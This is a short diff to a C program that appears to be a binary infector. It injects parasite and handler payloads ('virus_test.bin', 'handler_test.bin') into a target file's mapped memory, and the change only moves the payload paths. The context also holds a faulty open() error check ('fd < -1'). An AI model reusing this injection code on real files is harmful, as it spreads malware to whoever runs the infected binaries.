@@ -53,7 +53,7 @@ int main(int argc, char **argv)
     int fd = open(argv[1], O_RDWR);
     if(fd < -1)
         return(printf("Error while opening the file\n"), 1);
-    char *paths[] = {"virus_test.bin", "handler_test.bin", NULL};
+    char *paths[] = {"obj/assembly/virus_test.bin", "obj/assembly/handler_test.bin", NULL};
     calcul_payload(paths);
     if(!g_payload_size)
         return(printf("Error, payload issue\n"), 1);
@@ -98,11 +98,11 @@ int main(int argc, char **argv)
 
     unsigned char *ptr_injection = (unsigned char *)base + g_parasite_off;
 
-    int vfd = open("virus_test.bin", O_RDONLY);
+    int vfd = open("obj/assembly/virus_test.bin", O_RDONLY);
     read(vfd, ptr_injection, g_parasite_size);
     close(vfd);
 
-    vfd = open("handler_test.bin", O_RDONLY);
+    vfd = open("obj/assembly/handler_test.bin", O_RDONLY);
     read(vfd, ptr_injection + g_parasite_size, g_payload_size - g_parasite_size);
     close(vfd);
 
